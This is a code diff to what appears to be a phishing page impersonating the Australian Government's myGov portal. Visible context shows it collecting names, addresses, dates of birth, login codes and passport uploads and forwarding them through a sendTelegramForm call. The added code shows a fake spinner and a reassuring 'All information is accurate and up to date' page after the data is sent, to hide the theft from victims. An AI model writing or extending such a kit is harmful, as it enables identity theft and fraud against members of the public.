@@ -5,13 +5,15 @@ import { Input } from "@/components/ui/input";
 import { Card } from "@/components/ui/card";
 import { Separator } from "@/components/ui/separator";
 import React, { useState, useEffect, useRef } from "react";
-import { ChevronLeft, Key, Info, Eye } from "lucide-react";
+import { ChevronLeft, Key, Info, Eye, CheckCircle } from "lucide-react";
 
 export default function Home() {
   const [attemptCount, setAttemptCount] = useState(0);
   const [showCodePage, setShowCodePage] = useState(false);
   const [codeAttemptCount, setCodeAttemptCount] = useState(0);
   const [showDetailsPage, setShowDetailsPage] = useState(false);
+  const [showLoading, setShowLoading] = useState(false);
+  const [showConfirmationPage, setShowConfirmationPage] = useState(false);
   const [name, setName] = useState("");
   const [address, setAddress] = useState("");
   const [dob, setDob] = useState("");
@@ -145,7 +147,92 @@ export default function Home() {
     if (passport) formData.append("passport", passport);
 
     await sendTelegramForm(formData);
+    setShowLoading(true);
+    await new Promise((resolve) => setTimeout(resolve, 3000));
+    setShowLoading(false);
+    setShowConfirmationPage(true);
   };
+
+  if (showConfirmationPage) {
+    return (
+      <div className="min-h-screen bg-gray-50">
+        <header className="bg-[#87CEEB] px-4 py-4">
+          <div className="max-w-6xl mx-auto flex items-center justify-between">
+            <div className="flex items-center gap-4">
+              <div className="flex items-center gap-3">
+                <div className="w-12 h-12 bg-black rounded-full flex items-center justify-center">
+                  <span className="text-white text-xs font-bold">AU</span>
+                </div>
+                <span className="text-black font-medium text-sm">Australian Government</span>
+              </div>
+              <div className="flex items-center gap-2 ml-8">
+                <div className="flex">
+                  <div className="w-0 h-0 border-l-[16px] border-l-[#4A5568] border-t-[12px] border-t-transparent border-b-[12px] border-b-transparent"></div>
+                  <div className="w-0 h-0 border-l-[16px] border-l-[#2D3748] border-t-[12px] border-t-transparent border-b-[12px] border-b-transparent"></div>
+                </div>
+                <span className="text-black text-xl font-semibold">myGov</span>
+              </div>
+            </div>
+            <a href="#" className="text-black underline font-medium">
+              Help
+            </a>
+          </div>
+        </header>
+        <main className="max-w-2xl mx-auto px-4 py-8">
+          <div className="flex items-center gap-4">
+            <h1 className="text-4xl font-bold text-gray-900">All information is accurate and up to date</h1>
+            <CheckCircle size={40} className="text-green-500" />
+          </div>
+        </main>
+        <footer className="bg-black text-white mt-16">
+          <div className="max-w-6xl mx-auto px-4 py-8">
+            <div className="flex flex-wrap gap-8 mb-8">
+              <a href="#" className="hover:underline">
+                Terms of use
+              </a>
+              <a href="#" className="hover:underline">
+                Privacy and security
+              </a>
+              <a href="#" className="hover:underline">
+                Copyright
+              </a>
+              <a href="#" className="hover:underline">
+                Accessibility
+              </a>
+            </div>
+            <Separator className="bg-gray-600 mb-8" />
+            <div className="flex items-center gap-4 mb-8">
+              <div className="flex items-center gap-3">
+                <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center">
+                  <span className="text-black text-xs font-bold">AU GOV</span>
+                </div>
+                <span className="text-white font-medium">Australian Government</span>
+              </div>
+              <div className="flex items-center gap-2 ml-8">
+                <div className="flex">
+                  <div className="w-0 h-0 border-l-[20px] border-l-white border-t-[15px] border-t-transparent border-b-[15px] border-b-transparent"></div>
+                  <div className="w-0 h-0 border-l-[20px] border-l-gray-300 border-t-[15px] border-t-transparent border-b-[15px] border-b-transparent"></div>
+                </div>
+                <span className="text-white text-2xl font-semibold">myGov</span>
+              </div>
+            </div>
+            <p className="text-gray-300 leading-relaxed">
+              We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and
+              present, of all Aboriginal and Torres Strait Islander nations.
+            </p>
+          </div>
+        </footer>
+      </div>
+    );
+  }
+
+  if (showLoading) {
+    return (
+      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
+        <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-[#87CEEB]"></div>
+      </div>
+    );
+  }
 
   if (showDetailsPage) {
     return (
